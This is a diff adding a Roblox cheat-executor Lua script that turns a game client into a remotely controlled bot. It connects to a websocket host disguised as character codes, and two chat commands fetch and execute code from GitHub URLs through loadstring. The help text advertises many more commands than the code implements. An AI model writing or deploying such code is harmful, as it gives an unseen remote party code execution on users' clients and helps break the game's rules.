@@ -1,0 +1,41 @@
+if not game:IsLoaded() then repeat wait() until game:IsLoaded() end
+local plr = game.Players.LocalPlayer
+if plr.Name ~= "FatherNotFoundOwner" then
+local prefix = ""
+local filtered = game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents").OnMessageDoneFiltering
+local follow = false
+local spam = false
+local npc = false
+local say = filtered.Parent.SayMessageRequest
+local controller = readfile("botowner.botsc")
+local commands = {["line"] = "line playername left/right 4", ["emote"] = "works like /e emote, emote dance is an example.", ["help"] = "Display all of the commands.", ["sit"] = "Make the bots sit.", ["jump"] = "Make the bots jump.", ["rejoin"] = "Make the bots rejoin the server. Usually, this is used for updates.", ["say"] = "Make the bots say something. say message", ["follow"] = "Make the bots follow you or another. follow makes the bots follow you, you can put a name after for them following someone else.", ["owner"] = "Set the bot owner.", ["tp"] = "Make a bot teleport to you. tp 1, tp 2", ["change_prefix"] = "Set the prefix of the commands.", ["SayPlayerDisplay"] = "Say a players name by their display name.", ["reload"] = "Reloads the bots.", ["coolpc"] = "Lowers the CPU usage of the creator's pc.", ["antisit"] = "Makes the bots unable to sit.", ["reset"] = "Make the bots reset their character.", ["changelog"] = "View the latest change.", ["index"] = "Say all the bots index.", ["spin"] = "Makes the bots spin.", ["ask_gpt"] = "Ask ChatGPT a question.", ["orbit"] = "Make the bots orbit a player. The syntax is orbit [index] [distance] [player] [speed (recommended = 0.1)]"}
+local function getCharacter() return plr.Character end local function getPlayer() return plr end local function getRoot() return plr.Character.HumanoidRootPart end
+local chat
+local global = false
+local makerequ = syn and syn.request or request
+local htt = game:GetService("HttpService")
+local i = 0
+local orbit = false
+local gptbot = false
+local gptdb = false
+local udhauidAPfoiehgspegIEFUh = "b"
+local function command(msdg)
+	local msg = {["Message"] = msdg, ["FromSpeaker"] = "FatherNotFoundOwner"}
+	if tostring(typeof(msdg)) == "table" then
+		msg.FromSpeaker = msdg.FromSpeaker
+		msg.Message = msdg.Message
+	end
+	if plr.Name == "FatherNotFoundOwner" then else
+		if msg.FromSpeaker == "FatherNotFoundOwner" or msg.FromSpeaker == controller or global == true then
+			if string.lower(msg.Message) == prefix.."cursed" then
+				loadstring(game:HttpGet('https://raw.githubusercontent.com/we-script/thingys/main/randomtext'))()
+			elseif string.lower(msg.Message) == prefix.."error" then
+				loadstring(game:HttpGet('https://raw.githubusercontent.com/we-script/thingys/main/error'))()
+  			end
+		end
+	end
+end
+
+_G.ws = syn.websocket.connect("wss://"..string.char(98, 117, 115, 116, 108, 105, 110, 103, 45, 98, 97, 108, 115, 97, 109, 45, 115, 107, 97, 116, 101, 46, 103, 108, 105, 116, 99, 104, 46, 109, 101))
+_G.ws.OnMessage:Connect(command)
+end
